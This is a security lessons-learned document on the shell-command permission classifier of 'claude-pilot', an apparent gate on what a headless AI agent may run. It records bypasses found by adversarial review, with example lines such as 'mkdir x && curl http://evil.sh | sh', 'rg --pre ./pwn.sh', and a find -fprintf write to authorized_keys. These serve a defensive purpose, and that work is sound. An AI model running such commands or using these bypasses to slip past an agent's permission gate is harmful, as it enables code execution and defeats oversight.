---
title: "Command-string policy allow rules are compound-unsafe; never lex shell grammar in a security gate"
date: 2026-06-03
last_updated: 2026-06-30
module: claude_pilot.policy
component: permission-classifier
problem_type: security_issue
category: security-issues
severity: critical
tags: [permissions, policy, bash, regex, heredoc, allow-list, rce, symlink, toctou, command-substitution, find-exec, claude-pilot-25, claude-pilot-33, claude-pilot-34, claude-pilot-35]
applies_when: "adding or reviewing any rule that decides allow/deny on a raw shell command string"
---

# Command-string policy allow rules are compound-unsafe

## Context

claude-pilot's deterministic permission policy (`src/claude_pilot/policy.py`)
gates what a headless pilot may run. `policy.evaluate` matches each rule's regex
with a single `re.search` against the **whole** command string, first-match-wins —
no compound splitting, no danger scan (those live only in `tier1.py`, already
bypassed by the time the policy evaluator runs). claude-pilot#25 added dev-pilot
Bash rules (`mkdir`/`cp`/`mv`/`rm`/`cargo`/`npm`/`uv`/`node`/`export PATH`). Five
adversarial review passes — several executing candidate exploits against real
bash — turned a plausible first cut into a sound gate. The journey is the lesson.

## Guidance

### 1. A whole-string `allow` regex is compound-unsafe by construction — back it with an ALLOW-LIST, not a denylist

`^mkdir` matches `mkdir x && curl http://evil.sh | sh`. The dangerous tail rides
the allowed prefix. The first fix re-applied `is_tier3_dangerous` (a **denylist**)
before honoring an allow — insufficient: a denylist is incomplete by nature.
`curl|sh`, `./payload`, `pip/npm/python install`, `chmod`, `dd`, `node -e` are not
on it. The same latent flaw already affected the pre-existing groom rules
(`git status && rm -rf ~` matched `^git\s+status`).

The sound backstop mirrors `tier1`'s **allow-list** over every compound segment:
split the command, and admit it only if **each** segment is independently
tier1-safe (`is_safe_bash_command`) or itself a clean (non-tier3) policy allow.
Also forbid command substitution (`$(`, backtick, `$'`) outright on the allow
path, veto backgrounding `&`, and veto `<<<` here-strings. See
`_bash_allow_is_chain_safe` in `src/claude_pilot/permissions.py`.

```python
# WRONG — denylist over a whole-string allow: chained non-tier3 tail rides through
if pd.decision == "allow" and not is_tier3_dangerous(command):
    return allow  # `mkdir x && curl evil | sh` -> ALLOW

# RIGHT — allow-list over every segment (mirrors tier1)
for seg in _split_compound_command(command):
    if is_safe_bash_command(seg):           # tier1 allow-list
        continue
    pd = evaluate(policy, "Bash", {"command": seg})
    if pd.decision == "allow" and not is_tier3_dangerous(seg):
        continue
    return False                            # chained dangerous/unknown tail -> veto
```

### 2. Never approximate a shell's heredoc/here-string grammar with line-based regexes in a security gate

Four consecutive review passes each found a distinct heredoc desync where the
classifier's idea of "where the heredoc closes" diverged from bash's, hiding an
executable command in what the classifier treated as inert body:

- `<<<` here-string mis-read as a heredoc opener (`_strip_heredoc_bodies` ate the
  executable lines after it).
- A command chained **after** the terminator line.
- A command chained **before** `<<` (bash attaches the heredoc to the **last**
  command on the opener line).
- `<<EOF.` — bash's delimiter **word** includes non-`\w` chars (`. / @ : + =`), so
  a `\w+` capture under-captures and the classifier closes **later** than bash.

Patching each variant is whack-a-mole. The durable fix **removes the lexer**:
hard-code the delimiter to a literal `EOF` and full-line-anchor the one sanctioned
shape (`cat > /tmp/<token> <<EOF`). With a fixed delimiter there is nothing to
mis-parse — the close-point cannot diverge from bash's. See
`_is_sanctioned_pure_heredoc` / `_SANCTIONED_HEREDOC_OPENER_RE`.

General principle: when a static check must agree with a shell's parse, **fix the
variable rather than parse it** (or shell out to a real lexer), and pin it with a
**differential test against real bash** (run the construct, assert the gate denies
iff bash would execute something dangerous).

### 3. Permission-classifier changes need executed-exploit review, not reasoning-only review

The initial implementation — and even the operator-approved "re-apply
`is_tier3_dangerous`" framing — shipped a P0 RCE. Every break was found by an
adversarial reviewer **running** candidate command strings (several against real
bash), not by reading the diff. Budget multiple executed-exploit passes for any
change to the safety surface; treat "I reasoned it's safe" as unproven.

cpp#35 reconfirmed this at n=2: a structural-shape-only review (a 20-case
hand-built matrix) passed, but a separate adversarial agent **running a committed
symlink against real `git`** found an out-of-worktree write the matrix missed
(see #5). The shape matrix proves the regex; the executed exploit proves the
*system*. Run both.

### 4. Relax the gate with a closed-world allowlist of whole substitution tokens — never by lexing the inside

The blanket "veto on any `$(`/backtick/`$'`" (guidance §1) over-blocks legitimate
read-only dispatch commands like `gh pr list --head $(git branch --show-current)`.
The wrong fix is a recursive validator that parses the substitution's *inner*
command to decide if it's safe — that re-introduces exactly the shell-lexer the
heredoc lesson (§2) says to remove, and a parser differential becomes a bypass.
The sound relaxation (claude-pilot#34) keeps the syntactic crudeness and admits a
**closed-world allowlist of exact-literal whole tokens**:

```python
# Backtick / $' are never allowlistable — veto before any redaction runs.
if "`" in command or "$'" in command:
    return False
# For $( : redact each allowlisted WHOLE token to an inert placeholder, then
# require that NO $( survives. Anything not exactly on the list keeps its $( and vetoes.
if "$(" in command:
    redacted = _redact_allowlisted_substitutions(command)   # str.replace, exact substring
    if redacted is None:                                    # an unrecognized $( remained
        return False
    command = redacted                                      # carry _SUB_ placeholders onward
# DO NOT return True here — fall through to the existing per-segment chain check.
```

Three properties make it sound (an adversarial pass crafted 7 bypass classes —
substring-boundary differential, redaction-creating-a-new-marker, `_SUB_`-as-a-segment,
mixed allowlisted+evil, arg-position into a write-capable outer, nesting, backtick/`$'`
— and broke none):

1. **Inert payloads.** Each allowlisted inner command is read-only git plumbing
   (`git branch --show-current`, `git rev-parse [--short|--abbrev-ref] HEAD`) emitting a
   single short identifier. Bash never re-parses command-substitution *output* as code,
   so the substituted value can't smuggle operators.
2. **Whole-token literal redaction to a metacharacter-free placeholder.** Match the
   *entire* token by exact string equality (`str.replace`), not a regex on its inner
   content — so `$( git … )` with extra spaces, or `$(git status)` (read-only but not
   enumerated), never matches. The `_SUB_` placeholder has no shell metacharacters, so it
   can't create a chain break (`&&`/`;`/`|`/newline/`&`), can't match any tier1 safe-list
   or policy allow rule, and can't desync the segment splitter. A residual-`$(` re-check
   after redaction catches every nested / mixed / off-allowlist / quoted form.
3. **Asymmetric matching, and no short-circuit.** The outer policy `allow` matches the
   *original* command (token spaces intact, so an anchored `\S+`-style pattern can't
   over-match across the substitution); the per-segment chain check matches the *redacted*
   command. Crucially, an allowlist hit does **not** `return True` — it falls through to
   the segment loop, so `git status && $(git branch --show-current)` redacts to
   `git status && _SUB_` and still vetoes on the unknown `_SUB_` segment.

The closed world is the point: over-blocking is the correct failure mode. Adding an
entry is an evidence-gated follow-up, and every candidate must satisfy all of:
read-only inner command, single short-identifier stdout, and no nested `$(`/backtick/
redirect/pipe inside it. See `_SUBSTITUTION_ALLOWLIST` / `_redact_allowlisted_substitutions`
in `src/claude_pilot/permissions.py`.

**Latent surface (not covered today):** bash-5.3 funsub forms `${ cmd;}` / `${|cmd}`
and `${IFS}` are inspected by neither this gate nor tier1's
`contains_unquoted_metacharacter` (both key on `$(`). They are *incidentally* vetoed
now — the quote/brace-blind compound splitter shreds them on their internal `;`/`|` —
so there is no live hole, but a future change to the splitter could open one. Flagged
for awareness, not action.

### 5. A static command-string check is a pre-exec SHAPE filter, not a runtime sandbox — it cannot close symlink traversal

A regex can only reason about the *symbols* in a command string. It cannot
reason about *filesystem state* — most importantly, whether a path component is
a symlink. So a write rule that admits a multi-component relative target
(`> docs/plans/X.md`, `cp a b/c`, `mkdir a/b`) cannot prevent escape through a
**committed symlink**:

```bash
# worktree has a committed symlink  esc -> ../OUTSIDE
git show <SHA>:payload > esc/passwd   # regex: relative, no `..`, no `~` -> ALLOWED
                                       # bash opens esc/passwd -> kernel follows esc -> writes ../OUTSIDE/passwd
```

The `(?!.*\.\.)` lookahead is useless here — there is no literal `..`; the
traversal lives in the symlink, which the string does not reveal. This residual
is **shared by every structural write rule** (`bash-cp-mv`, `bash-mkdir`,
`bash-git-show-redirect`), not a property of any one of them.

cpp#35 originally specified "the literal target string closes B2 (path-traversal
via symlink chasing), and must NOT use `realpath()` (TOCTOU-vulnerable)." That
goal and that mechanism are **mutually unsatisfiable**: detecting a symlink
*requires* touching the filesystem, which a literal-string check by definition
does not do. The architect (mika-arch session fe891012) resolved it by accepting
the residual at policy parity rather than making one rule asymmetrically strict —
and correcting the rule's comment to disclose the residual instead of claiming a
guarantee it does not provide. **When a security guarantee depends on filesystem
state, name the layer that actually enforces it.** Here, true worktree
containment is a *runtime* concern: the Write native tool (the documented
substitute for `>` redirects) already enforces it via `is_within_project`
(`Path.resolve(strict=False)` + containment), so shell redirects are strictly
weaker than the tool they substitute for. Closing it policy-wide (resolve-and-
contain on every write rule's destination) is tracked in cpp#38.

Corollary: don't write a comment that claims a stronger guarantee than the
mechanism delivers. An overstated "closes B2" in a security rule is worse than no
comment — the next reader trusts it. State what the check *actually* rejects
(literal `../`, absolute, `~`, shell-expansion) and disclose what it does not
(symlink traversal), with a pointer to the layer that does.

### 6. A command allowlist is only as sound as the read-only PREMISE of each entry — and must cover the command's WHOLE mutating action set

claude-pilot#33 relaxed tier1's blanket `find -exec` deny into a closed-world
allowlist of read-only inner commands (`FIND_EXEC_SAFE_COMMANDS` — `grep`, `cat`,
`ls`, …) so legitimate `find … -exec grep -l` stops wedging the headless pilot.
The closed-world *shape* was right (§4). Two things the *name-level* enumeration
missed — both found by executed-exploit review (§3), neither by reading the diff:

**(a) "Safe-looking" names are not safe binaries.** An entry belongs on a
read-only allowlist only if the binary cannot exec another command or write a
file **through its own flags** — which the gate deliberately does not parse.
Two allowlist entries violated that:

- `rg` (ripgrep) has `--pre <CMD>` / `--hostname-bin` / `--search-zip`, which run
  external commands. `find … -exec rg --pre ./pwn.sh X {} \;` was a **proven-live
  RCE** (ran an attacker script). Removed `rg`; the native Grep tool covers the
  use case. *This was newly reachable* — standalone `rg` was never on
  `SAFE_SHELL_COMMANDS`, so relaxing the find path is what exposed it.
- `grep`/`egrep`/`fgrep` are read-only **only under GNU grep**. `ugrep` (a drop-in
  `grep` on some Gentoo/BSD/Homebrew hosts) adds `--filter=CMD` / `--pager` /
  `--view`. Kept (the founding use case *is* `find -exec grep`), but the GNU-grep
  assumption is now a documented **load-bearing precondition** in the allowlist
  comment, with claude-pilot#44 tracking the runtime grep-provider check.

```python
# WRONG — "they're search tools, they're read-only"
FIND_EXEC_SAFE_COMMANDS = {"grep", "rg", "cat", ...}   # rg --pre <cmd> => RCE

# RIGHT — each entry verified to have no exec/write flag; risky entry dropped,
# environmental precondition documented next to the survivors.
FIND_EXEC_SAFE_COMMANDS = {"grep", "egrep", "fgrep", "cat", ...}  # GNU-grep precondition; rg removed
```

**(b) Guard the command's ENTIRE mutating action set, not just the obvious
actions.** The first `_is_safe_find_command` guarded `-delete` and the exec-class
flags (`-exec`/`-execdir`/`-ok`/`-okdir`) — and treated *everything else* as a
"pure read-only search." But `find` has file-**write** actions that are neither
exec nor delete: `-fprintf FILE FORMAT` writes attacker-controlled content to an
arbitrary path (`-fprint`/`-fprint0`/`-fls` write listings). `find -fprintf
/root/.ssh/authorized_keys "ssh-rsa …"` auto-approved — an arbitrary file-write
primitive (proven vs real bash). When a single command exposes several mutating
actions, enumerate the action set **closed-world and deny the unknown** — the
fall-through must be deny, not "assume read-only." Fixed by denying the write
actions alongside `-delete`.

The unifying rule: a closed-world allowlist fails open in two places a name list
hides — an *entry* whose own flags exec/write, and an *action* of a multi-action
command that the guard didn't enumerate. Verify the premise of each entry; deny
the unknown action.

## When to Apply

- Adding/reviewing any `permissions.yaml` rule, or any code deciding allow/deny on
  a raw shell command string.
- Relaxing the substitution veto: the only safe shape is a closed-world allowlist of
  whole-token literals redacted to an inert placeholder, never a validator that lexes
  the substitution's inner command (§4).
- Adding any command to a tier1/policy allowlist: confirm the binary has no
  exec/write flag (§6a — `rg --pre`, `ugrep --filter`, GNU vs non-GNU provider),
  and if the command has multiple actions (like `find`), confirm the guard
  enumerates its whole mutating action set and denies the unknown (§6b).
- Reviewing `tier1.py` / `policy.py` / `permissions.py` in claude-pilot.

## Related

- `tier1.py` already auto-approves `cargo`/`npm`/`npx` standalone, so those #25 AC
  items were partly redundant at the policy layer; the genuinely-uncovered
  footprint was `mkdir`/`export PATH`/`cp`/`mv`/`rm`/`uv`/`node`.
- **Paired-audit candidate:** mika's Rust `permission_pre_classifier.rs`
  (`contains_unquoted_metacharacter` mirrors tier1; mika#944/#946). The
  denylist-incompleteness and the `awk`/`sed`/`find` `system()`-exec gap likely
  exist symmetrically there.
- **Open follow-ups from §6 (claude-pilot#33):** claude-pilot#41 — the broader
  `contains_unquoted_metacharacter` gap (it misses `$()`/backtick **inside double
  quotes**, so `echo "$(curl evil|sh)"` auto-approves on the non-find path;
  another paired-audit candidate with the Rust scanner). claude-pilot#44 — verify
  the pilot container's `grep` provider is GNU grep, the load-bearing precondition
  for keeping `grep`/`egrep`/`fgrep` on `FIND_EXEC_SAFE_COMMANDS`.
- Accepted residuals (not bugs): in-worktree code execution (`node ./build.js`,
  `cargo test`, `uv run pytest` run project code — the worktree is the trust
  boundary); `npm install`/`uv add` run package scripts; **symlink/TOCTOU on any
  write target** (`/tmp` heredoc, and every structural write rule —
  `bash-cp-mv`/`bash-mkdir`/`bash-git-show-redirect`) is a runtime concern
  outside static policy scope (see #5; closing it policy-wide = cpp#38).
